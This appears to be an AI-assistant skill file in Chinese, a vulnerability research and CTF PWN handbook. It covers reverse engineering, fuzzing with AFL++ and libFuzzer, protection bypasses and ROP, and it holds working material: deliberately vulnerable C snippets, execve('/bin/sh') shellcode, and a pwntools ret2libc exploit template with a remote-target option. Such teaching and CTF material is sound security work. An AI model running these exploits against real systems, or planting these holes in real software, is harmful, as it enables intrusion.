---
name: vuln-research
description: 漏洞研究。二進位制分析、逆向工程、Exploit開發、Fuzzing。當使用者提到漏洞研究、二進位制、逆向、Exploit、Fuzzing、PWN、棧溢位、堆溢位時使用。
---

# 🔥 赤焰秘典 · 漏洞研究 (Vulnerability Research)


## 研究流程

```
目標分析 → 逆向工程 → 漏洞發現 → Exploit開發 → 報告/披露
    │           │           │           │           │
    └─ 架構 ────┴─ IDA ─────┴─ Fuzz ────┴─ PoC ────┴─ CVE
```

## 逆向工程

### 靜態分析
```bash
# 檔案資訊
file binary
strings binary | grep -i password
readelf -h binary
objdump -d binary

# IDA Pro / Ghidra
# 反彙編、反編譯、交叉引用分析
```

### 動態分析
```bash
# GDB 除錯
gdb ./binary
(gdb) break main
(gdb) run
(gdb) disas
(gdb) x/20x $esp
(gdb) info registers

# strace/ltrace
strace ./binary
ltrace ./binary

# GDB 增強
# pwndbg / GEF / peda
```

### 常用工具
```yaml
反彙編/反編譯:
  - IDA Pro: 商業，最強大
  - Ghidra: 開源，NSA出品
  - Binary Ninja: 現代化
  - Radare2: 開源命令列

偵錯程式:
  - GDB + pwndbg/GEF
  - x64dbg (Windows)
  - WinDbg (Windows核心)
  - LLDB (macOS)

輔助工具:
  - ROPgadget: ROP鏈構造
  - one_gadget: libc gadget
  - patchelf: ELF修改
  - checksec: 安全機制檢查
```

## 漏洞型別

### 棧溢位
```c
// 漏洞程式碼
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 無邊界檢查
}

// 利用思路
// 1. 覆蓋返回地址
// 2. 跳轉到 shellcode 或 ROP 鏈
```

```python
# Exploit 模板
from pwn import *

context.arch = 'amd64'
p = process('./vuln')

# 構造 payload
padding = b'A' * 72  # 填充到返回地址
ret_addr = p64(0x401234)  # 目標地址

payload = padding + ret_addr
p.sendline(payload)
p.interactive()
```

### 堆溢位
```c
// 漏洞程式碼
struct chunk {
    char data[32];
    void (*func_ptr)();
};

void vulnerable(char *input) {
    struct chunk *c = malloc(sizeof(struct chunk));
    strcpy(c->data, input);  // 溢位覆蓋 func_ptr
    c->func_ptr();
}
```

### Use-After-Free
```c
// 漏洞程式碼
void vulnerable() {
    char *ptr = malloc(64);
    free(ptr);
    // ptr 未置空
    strcpy(ptr, user_input);  // UAF
}
```

### 格式化字串
```c
// 漏洞程式碼
void vulnerable(char *input) {
    printf(input);  // 格式化字串漏洞
}

// 利用
// %x - 洩露棧資料
// %n - 任意寫
// %s - 任意讀
```

## 保護機制繞過

### 檢查保護
```bash
checksec ./binary
# RELRO, Stack Canary, NX, PIE, FORTIFY
```

### 繞過技術
```yaml
NX (不可執行):
  - ROP (Return Oriented Programming)
  - ret2libc
  - ret2syscall

ASLR (地址隨機化):
  - 資訊洩露
  - 暴力破解 (32位)
  - 部分覆蓋

Stack Canary:
  - 資訊洩露
  - 逐位元組爆破
  - 覆蓋 __stack_chk_fail

PIE (位置無關):
  - 資訊洩露基址
  - 部分覆蓋

RELRO:
  - Partial: 覆蓋 GOT
  - Full: 其他利用方式
```

### ROP 鏈構造
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 洩露 libc 地址
rop.puts(elf.got['puts'])
rop.main()

# 計算 libc 基址
libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 第二階段 ROP
rop2 = ROP(libc)
rop2.system(bin_sh)
```

## Fuzzing

### AFL++
```bash
# 編譯插樁
afl-gcc -o target_afl target.c

# 準備種子
mkdir input output
echo "seed" > input/seed

# 開始 Fuzz
afl-fuzz -i input -o output -- ./target_afl @@

# 分析崩潰
afl-tmin -i output/crashes/id:000000 -o minimized -- ./target_afl @@
```

### LibFuzzer
```cpp
// fuzz_target.cpp
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // 呼叫被測函式
    parse_input(data, size);
    return 0;
}
```

```bash
# 編譯
clang++ -fsanitize=fuzzer,address fuzz_target.cpp -o fuzzer

# 執行
./fuzzer corpus/
```

### 智慧 Fuzzing
```python
# 基於覆蓋率的 Fuzzing
# 使用 AFL、LibFuzzer 等

# 基於語法的 Fuzzing
# 使用 Peach、Domato 等

# 符號執行輔助
# 使用 KLEE、angr 等
```

## Exploit 開發

### Shellcode
```python
# pwntools 生成
from pwn import *
context.arch = 'amd64'

# execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())

# 自定義 shellcode
shellcode = asm('''
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
''')
```

### 完整 Exploit 模板
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# 配置
binary = './vuln'
libc_path = './libc.so.6'
host, port = 'target.com', 1337

# 載入
elf = ELF(binary)
libc = ELF(libc_path)

def exploit(p):
    # 1. 洩露地址
    payload1 = b'A' * 72
    payload1 += p64(elf.plt['puts'])
    payload1 += p64(elf.got['puts'])
    payload1 += p64(elf.symbols['main'])

    p.sendline(payload1)
    leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = leaked - libc.symbols['puts']
    log.success(f"libc base: {hex(libc_base)}")

    # 2. 獲取 shell
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    payload2 = b'A' * 72
    payload2 += p64(libc_base + 0x4f3d5)  # one_gadget

    p.sendline(payload2)
    p.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(binary)
    exploit(p)
```

## CTF PWN 技巧

### 常見題型
```yaml
棧溢位:
  - ret2text: 跳轉到後門函式
  - ret2shellcode: 跳轉到 shellcode
  - ret2libc: 呼叫 system("/bin/sh")
  - ROP: 構造 ROP 鏈

堆利用:
  - fastbin attack
  - unsorted bin attack
  - tcache poisoning
  - house of 系列

格式化字串:
  - 洩露棧/libc地址
  - 任意寫 GOT
  - 修改返回地址
```

### 快速解題流程
```bash
# 1. 檢查保護
checksec ./pwn

# 2. 執行測試
./pwn

# 3. 反編譯分析
# IDA/Ghidra

# 4. 確定漏洞點
# 5. 編寫 Exploit
# 6. 本地測試
# 7. 遠端利用
```

## 工具清單

| 工具 | 用途 |
|------|------|
| IDA Pro | 反彙編/反編譯 |
| Ghidra | 開源逆向 |
| pwntools | Exploit 開發 |
| GDB + pwndbg | 除錯 |
| AFL++ | Fuzzing |
| ROPgadget | ROP 鏈 |
| one_gadget | libc gadget |
| angr | 符號執行 |

---

